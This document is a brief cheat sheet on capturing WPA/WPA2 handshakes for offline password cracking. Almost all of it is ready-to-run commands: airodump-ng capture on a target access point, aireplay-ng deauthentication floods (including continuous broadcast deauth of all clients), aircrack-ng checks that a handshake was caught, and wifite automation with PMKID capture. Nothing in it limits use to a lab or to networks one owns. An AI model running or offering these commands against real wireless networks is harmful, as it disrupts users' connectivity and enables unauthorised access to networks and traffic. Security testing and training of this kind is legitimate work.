# WPA/WPA2 Handshake Capture

Capturing the 4-way handshake between a client and AP is required for offline PSK cracking.

## Capture with airodump-ng
```bash
# 1. Target a specific AP on its channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# 2. In a second terminal, deauth a connected client to force reconnection
#    (this triggers the handshake)
sudo aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
```

## Deauthentication Attack
```bash
# Send 5 deauth packets to broadcast (all clients on AP)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Send deauth to specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Continuous deauth (keep sending until Ctrl+C)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

## Verify Handshake Captured
```bash
# Check if handshake is in the capture file
# Look for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output

# Or use aircrack-ng to verify
aircrack-ng handshake-01.cap

# Look for: "1 handshake(s)" message
```

## Capture with Wifite (Automated)
```bash
# Wifite automates the entire process
sudo wifite

# Target specific network
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# PMKID capture only
sudo wifite --pmkid

# New handshakes only (ignore existing)
sudo wifite --new-hs
```
